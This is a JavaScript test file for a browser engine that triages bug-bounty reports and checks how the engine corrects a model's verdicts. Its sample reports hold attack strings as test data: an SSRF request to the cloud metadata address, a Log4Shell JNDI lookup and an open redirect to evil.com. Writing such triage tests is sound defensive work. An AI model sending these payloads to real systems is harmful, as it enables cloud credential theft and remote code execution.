// Node test for the browser triage engine (docs/engine.mjs).
// Mirrors eval/adversarial.py so the in-browser defenses are proven to match
// the Python pipeline.  Run:  node docs/engine.test.mjs
import { enrich, assess, heuristic, applyDefenses, normalizeVerdict,
         extractJson, renderUser, corrBlock } from "./engine.mjs";

let pass = 0, fail = 0;
function check(name, cond, detail = "") {
  (cond ? pass++ : fail++);
  console.log(`  ${cond ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);
}

// Full production path (no model): enrich -> assess -> heuristic -> defenses.
function triage(sub) {
  const corr = enrich(sub);
  const ev = assess(sub, corr);
  const v = applyDefenses(heuristic(sub, corr), corr, ev, sub);
  return { v, corr, ev };
}

console.log("== engine end-to-end (heuristic + defense) ==");
{
  const { v } = triage({ title: "SSRF in URL preview reaches cloud metadata", severity_claimed: "Critical",
    asset: "app.example.com", description: "link preview fetches http://169.254.169.254/latest/meta-data/ server-side.",
    steps_to_reproduce: "1. paste the URL. 2. credentials returned.", impact: "cloud cred theft" });
  check("ssrf -> valid_impactful", v.disposition === "valid_impactful", v.disposition);
}
{
  const { v, corr } = triage({ title: "Log4Shell", severity_claimed: "Critical", asset: "logs.example.com",
    description: "vulnerable to CVE-2021-44228 (Log4Shell).", steps_to_reproduce: "send ${jndi:ldap://x}", impact: "RCE" });
  check("KEV CVE -> corroborated_surge", v.disposition === "corroborated_surge", v.disposition);
  check("KEV CVE -> in_kev true", corr.in_kev === true);
  check("KEV CVE -> severity critical", v.severity_estimate === "critical", v.severity_estimate);
}
{
  const { v } = triage({ title: "scanner dump", severity_claimed: "Critical", asset: "example.com",
    description: "[*] nuclei results: missing headers", steps_to_reproduce: "run nuclei", impact: "various" });
  check("nuclei output -> slop", v.disposition === "slop", v.disposition);
}
{
  const { v } = triage({ title: "self-XSS", severity_claimed: "High", asset: "app.example.com",
    description: "paste this into your devtools console to run code", steps_to_reproduce: "open console, paste", impact: "ATO" });
  check("console-paste -> self_inflicted", v.disposition === "self_inflicted", v.disposition);
}

console.log("\n== defense unit (corrects a MODEL verdict) ==");
// no-PoC post-map: model says theoretical_no_poc but body has real PoC markers.
{
  const sub = { title: "SSRF", description: "fetch internal metadata:\ncurl http://169.254.169.254/ via image param",
    steps_to_reproduce: "", impact: "" };
  const v = applyDefenses({ disposition: "theoretical_no_poc", severity_estimate: "high", confidence: 0.8 },
    { matched: false }, {}, sub);
  check("no-PoC + PoC markers + high -> valid_impactful", v.disposition === "valid_impactful", v.disposition);
}
{
  const sub = { title: "open redirect", description: "repro:\n```\nGET /go?u=//evil.com\n```", steps_to_reproduce: "", impact: "" };
  const v = applyDefenses({ disposition: "theoretical_no_poc", severity_estimate: "medium", confidence: 0.7 },
    { matched: false }, {}, sub);
  check("no-PoC + PoC markers + med -> valid_low", v.disposition === "valid_low", v.disposition);
}
{
  const sub = { title: "theoretical", description: "an attacker could conceivably abuse this design.", steps_to_reproduce: "", impact: "" };
  const v = applyDefenses({ disposition: "theoretical_no_poc", severity_estimate: "none", confidence: 0.6 },
    { matched: false }, {}, sub);
  check("no markers -> stays theoretical_no_poc", v.disposition === "theoretical_no_poc", v.disposition);
}
{
  const v = applyDefenses({ disposition: "slop", severity_estimate: "none", confidence: 0.5 },
    { matched: true, in_kev: true }, {}, { title: "x", description: "y" });
  check("corroboration -> surge/critical", v.disposition === "corroborated_surge" && v.severity_estimate === "critical");
}
{
  const v = applyDefenses({ disposition: "valid_impactful", severity_estimate: "critical", confidence: 0.95 },
    { matched: false }, { hint: "fabricated" }, { title: "x", description: "y" });
  check("fabricated -> slop", v.disposition === "slop", v.disposition);
}
{
  const v = applyDefenses({ disposition: "valid_impactful", severity_estimate: "high", confidence: 0.95 },
    { matched: false }, { reliability: 0.2 }, { title: "x", description: "y" });
  check("confidence gated by reliability (<=0.52)", v.confidence <= 0.4 + 0.6 * 0.2 + 1e-9, String(v.confidence));
}

console.log("\n== rendering + parsing ==");
{
  const r = renderUser({ title: "T", severity_claimed: "High", asset: "a.com", description: "body", steps_to_reproduce: "", impact: "" },
    corrBlock({ matched: false }));
  check("renderUser omits empty Steps/Impact", !/Steps to reproduce:/.test(r) && !/\nImpact:/.test(r));
  check("renderUser keeps Description", /Description:\nbody/.test(r));
}
{
  const r = renderUser({ title: "T", severity_claimed: "High", asset: "a.com", description: "d", steps_to_reproduce: "do x", impact: "boom" },
    corrBlock({ matched: false }));
  check("renderUser includes non-empty Steps + Impact", /Steps to reproduce:\ndo x/.test(r) && /Impact:\nboom/.test(r));
}
{
  const v = normalizeVerdict(extractJson('thinking... <think>blah</think> final: {"disposition":"valid_low","confidence":"high","severity_estimate":"LOW"}'));
  check("extractJson grabs trailing JSON after <think>", v.disposition === "valid_low", v.disposition);
  check("normalize: word confidence -> number", v.confidence === 0.85, String(v.confidence));
  check("normalize: severity lowercased/validated", v.severity_estimate === "low", v.severity_estimate);
}

console.log(`\nTOTAL: ${pass}/${pass + fail} passed`);
process.exit(fail === 0 ? 0 : 1);
